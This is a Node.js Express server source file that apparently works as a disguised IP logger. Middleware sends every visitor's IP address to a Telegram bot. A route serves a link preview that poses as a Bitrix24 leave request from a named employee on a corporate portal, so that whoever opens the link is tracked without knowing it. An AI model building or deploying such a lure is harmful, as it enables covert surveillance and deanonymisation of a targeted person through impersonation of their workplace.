const express = require('express');
const app = express();
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

// Use the 'trust proxy' setting to capture client's IP behind proxy
app.set('trust proxy', true);

// Initialize the Telegram Bot with your bot token
const bot = new TelegramBot('YOUR_TELEGRAM_BOT_TOKEN', { polling: false });

app.use((req, res, next) => {
    const clientIp = req.ip || req.headers['x-forwarded-for']; // Capture client's IP
    console.log(`IP-адрес посетителя: ${clientIp}`);

    // Send the client's IP address to your Telegram bot
    bot.sendMessage('YOUR_CHAT_ID', `Client IP: ${clientIp}`)
        .then(() => {
            console.log('IP sent to Telegram bot');
        })
        .catch((error) => {
            console.error('Error sending IP to Telegram bot:', error);
        });

    next();
});

app.get('/order/bitrix24/Bayakhmetov&Anuar', async (req, res) => {
    const imageUrl = 'https://letsenhance.io/static/8f5e523ee6b2479e26ecc91b9c25261e/1015f/MainAfter.jpg';

    // Render an HTML page with the meta tags
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Custom Link Preview</title>
            <meta property="og:title" content="Portal ProPeople">
            <meta property="og:url" content="https://portal.propeople.kz/stream/" />
            <meta property="og:description" content="Заявление на отгул Баяхметов Ануар">
            <meta property="og:image" content="https://letsenhance.io/static/8f5e523ee6b2479e26ecc91b9c25261e/1015f/MainAfter.jpg">
            <meta name="description" content="Заявление на отгул Баяхметов Ануар Битрикс24">
        </head>
        <body>
            <img src="https://letsenhance.io/static/8f5e523ee6b2479e26ecc91b9c25261e/1015f/MainAfter.jpg" alt="Example Image" style="max-width: 100%;">
        </body>
        </html>
    `);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});

module.exports = app;
